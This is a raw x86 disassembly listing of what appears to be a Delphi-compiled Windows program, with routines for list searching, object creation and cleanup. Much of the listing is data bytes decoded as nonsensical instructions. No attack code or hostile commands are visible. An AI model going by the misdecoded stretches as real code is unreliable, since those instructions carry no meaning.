or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
insb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] al
inc ecx
add [ eax ] dh
add [ eax ] al
add al dh
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ebp * 4 ] dl
inc ecx
add [ eax - 0x17ffbe70 ] dl
add [ esi + ebp * 4 - 0x4cbbffbf ] bl
inc ecx
popad
scasb [ edi ]
inc ecx
add al ch
scasb [ edi ]
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
mov al [ 0x240041af ]
mov al 0x41
add [ edi ] al
push esp
push ebx
je r-xdata
pushfd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fsub [ esi + 0x41 ]
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
nop
imul eax [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
imul eax [ ecx ] 0x8
int3
mov dl 0x41
add [ eax ] cl
mov bl 0x41
add [ eax + 0x180041af ] ah
mov bl 0x41
add [ 0x6e614854 ] cl
clc
popad
insd
test [ eax + 0x41 ] ch
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
add al 0x6a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push 0x41
add [ eax ] dl
add [ eax ] al
add [ eax ] bh
push 0x34e00041
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbfce ] ah
scasb [ edi ]
inc ecx
add al ch
scasb [ edi ]
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add [ ebp + esi * 4 + 0x41 ] dl
add ah ch
sub al [ eax ]
insb
push ebx
je r-xdata
outsb
jae r-xdata
add [ eax - 0x4d ] bl
inc ecx
add al bh
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbfce ] ah
scasb [ edi ]
inc ecx
add [ ebx + esi * 4 + 0x41 ] al
insd
lodsb [ esi ]
push 0x7070041
push esp
push ebx
je r-xdata
popad
add [ ebp + 0x68840040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4004168 ] ah
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
jns r-xdata
push ebx
je r-xdata
add [ ebp + 0x69180040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 ] dh
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] bh
push 0x34e00041
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
pushfd
je r-xdata
insd
outsd
jb r-xdata
popad
insd
sub [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1400416a ]
add [ eax ] al
add [ eax - 0x1fffbe97 ] bh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbe4b ] dh
scasb [ edi ]
inc ecx
add [ esi + esi * 4 + 0x41 ] dl
add [ eax ] al
scasd [ edi ]
inc ecx
add [ ebp + esi * 4 + 0x41 ] dl
add [ edi + esi * 4 ] cl
inc ecx
add [ ebp + esi * 4 - 0x4fdbffbf ] cl
inc ecx
add [ eax + 0xd0041b6 ] al
push esp
dec ebp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
scasb [ edi ]
inc ecx
add al ch
scasb [ edi ]
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add [ ebp + esi * 4 + 0x41 ] dl
add al cl
mov eax 0xb58c0041
inc ecx
add [ eax + esi * 4 ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
cld
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
imul eax [ ecx ] 0x18
add [ eax ] al
add [ eax - 0x1fffbe97 ] bh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbe48 ] dl
push ebx
push ebx
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_416a19
mov ch 0x41
add [ eax + esi * 4 ] ah
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
and al 0xb0
je r-xdata
push ebx
push ebx
inc ecx
add [ eax + 0xd0041b6 ] al
push esp
dec ebp
inc ecx
add [ eax + esi * 4 ] ah
insd
dec ebp
insd
outsd
jb r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
popad
insd
mov eax eax
cld
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
imul eax [ ecx ] 0x18
add [ eax ] al
add [ eax - 0x1fffbe97 ] bh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbe48 ] dl
jns r-xdata
push ebx
je r-xdata
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
scasb [ edi ]
inc ecx
add al ch
scasb [ edi ]
inc ecx
add [ eax ] al
scasd [ edi ]
inc ecx
add [ ebp + esi * 4 + 0x41 ] dl
add al cl
mov eax 0xb58c0041
inc ecx
add [ eax + esi * 4 ] ah
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
pushfd
je r-xdata
insd
outsd
jb r-xdata
popad
insd
sub [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x1400416a ]
add [ eax ] al
add [ eax - 0x1fffbe97 ] bh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x63ffbe4b ] dh
scasb [ edi ]
inc ecx
add [ esi + esi * 4 + 0x41 ] dl
add [ eax ] al
scasd [ edi ]
inc ecx
add [ ebp + esi * 4 + 0x41 ] dl
add [ edi + esi * 4 ] cl
inc ecx
add [ ebp + esi * 4 - 0x4fdbffbf ] cl
sub_416be5
add ah cl
imul eax [ ecx ] 0xffffffd6
imul eax [ ecx ] 0xffffffa7
imul eax [ ecx ] 0xffffffb4
imul eax [ ecx ] 0x29
imul eax [ ecx ] 0x37
imul eax [ ecx ] 0x45
imul eax [ ecx ] 0x53
imul eax [ ecx ] 0x61
imul eax [ ecx ] 0x6f
imul eax [ ecx ] 0x7d
imul eax [ ecx ] 0xffffff8b
imul eax [ ecx ] 0xffffff99
imul eax [ ecx ] 0x1
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
loop r-xdata
add [ eax - 0x53ffbdde ] ah
and al [ edx ]
mov eax 0xc4004222
and al [ edx ]
shl [ edx ] 0x1
inc edx
add [ ebx + 0x42 ] cl
add [ esi ] cl
push esp
push ebx
je r-xdata
inc ecx
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov [ ecx + eax * 2 ] ch
sbb ch [ ecx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg [ esi + 0x41 ] ch
add [ eax + eax ] cl
add [ ecx + eax * 8 - 0x1c97ffbf ] cl
inc ecx
add [ eax - 0x1d ] dl
inc ecx
add ah cl
rol [ ecx ] 0x1
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 2 + 0x41 ] bh
add [ eax ] ch
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] ch
mov ecx 0xb9500041
inc ecx
add ah ch
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x416dd090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edi + 0x41 ] ch
je r-xdata
add [ eax + eax ] bh
add [ eax ] ah
insd
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al ch
mov edi 0xb9500041
inc ecx
add [ eax - 0x40 ] cl
inc ecx
add [ eax + eax * 8 + 0x41 ] bh
add [ eax + 0x6c0041c3 ] dl
rol [ ecx ] 0x98
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or ch [ esi + 0x41 ]
add [ eax ] ah
insd
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + ebp * 8 ] bl
inc ecx
add ah bh
call 0xffffffffe8956ea7
inc ecx
add [ eax + ebp * 8 + 0x41 ] bh
add [ eax - 0x57ffbe18 ] bh
in al dx
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c0040 ] dl
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
shl [ eax + 0x6e ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x6c
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x34e00040 ] ah
inc eax
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x17ffbde2 ] dh
push ds
inc edx
add [ eax + 0x1f ] dl
inc edx
add [ eax + 0x3c00421f ] bh
and [ edx ] al
mov al [ 0xffffffffa0004220 ]
and al [ edx ]
lodsb [ esi ]
adc [ ebp + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
insd
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ ebp + edi * 2 + 0x540c0041 ] al
inc ebx
insb
popad
jae r-xdata
add [ ebx - 0x27fbdbbc ] al
jmp sub_421b60
jae r-xdata
add [ eax ] al
jb r-xdata
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
outsb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ ebp + ebp * 2 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x6f680040 ] cl
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + eax ] bh
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add [ edi + ecx + 0x34f00042 ] bh
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edi + ecx + 0x42 ] dl
add [ eax + 0x10 ] dh
inc edx
add ah ch
sub al [ eax ]
pop es
push esp
push esp
push 0x64616572
inc esp
outsd
inc ecx
add [ edi ] al
pop es
push esp
push esp
push 0x64616572
xor [ edi + 0x41 ] ch
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
rcr ah 0x6e
inc ecx
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
outsb
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0xe0004072
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x7004032 ] ah
inc ebp
push esp
push 0x64616572
xor [ edi + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
outsd
inc ecx
fsubr [ esi + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4c00416e ] al
add [ eax ] al
inc ecx
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
jl r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
add [ esp + 0x4 ] 0xffffffd4
jmp r-xdata
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
inc esp
and al 0x4
aam 0xe9
arpl [ ebx - 0x46340000 ] bp
outsd
inc ecx
add bh al
outsd
inc ecx
add cl dl
outsd
inc ecx
add [ ecx - 0x24ffbe91 ] dh
outsd
inc ecx
add cl ch
outsd
inc ecx
add bl dh
outsd
inc ecx
add [ edx ] al
jns r-xdata
pop ebp
retn 0x4
rcr al 0xe9
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e82909
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
jae r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1
add bh bh
sub_417330
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406158
pop edi
pop esi
pop ebx
retn
sub_417358
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_40613c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_417380
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_406178
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4173dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x74
inc ecx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al ah
jne r-xdata
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
add al 0x89
add al 0x24
mov eax eax
jl r-xdata
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
and al 0x8b
inc eax
or al 0x8b
jo r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x41 ] bh
add [ eax + eax ] ah
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] cl
jns r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034c4
test al al
je r-xdata
dec esi
test esi esi
jl r-xdata
call sub_4189b0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034c4
test al al
je r-xdata
xlat
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
nop
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417494
mov esi eax
jmp r-xdata
dec eax
xor al [ eax ]
xor al [ fs : eax ]
loopne r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417494
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push ebp
add esp 0xfffffff8
inc ecx
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034c4
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417494
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4189b0
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034c4
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034c4
test al al
je r-xdata
sub_4174f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_417494
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417494
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034c4
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417564
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403280
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_418854
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4175e0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
mov eax [ esi + 0x4 ]
call sub_4032b0
mov eax [ esi + 0x8 ]
call sub_4032b0
mov eax [ esi + 0xc ]
call sub_4032b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_417620
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4189b0
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_403214
test al al
jne r-xdata
sub_417680
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4189b0
mov edx eax
mov eax ebp
call sub_4034c4
test al al
jne r-xdata
sub_4176c4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41775f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403200
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404310
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_417620
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417766
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
sub_417784
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_4052fc
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4177a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4189b0
mov edx edi
call sub_417784
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4189b0
mov edx edi
call sub_417784
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4188a0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_417784
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4188a0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417848
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
